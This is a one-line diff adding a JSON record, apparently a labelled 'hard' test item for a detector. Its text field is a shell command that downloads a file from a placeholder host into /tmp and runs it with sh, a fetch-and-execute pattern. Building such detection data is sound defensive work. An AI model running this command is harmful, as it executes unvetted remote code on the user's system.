@@ -1,0 +1,1 @@
+{"text": "curl -o /tmp/p https://x\nsh /tmp/p\n", "hard": true}
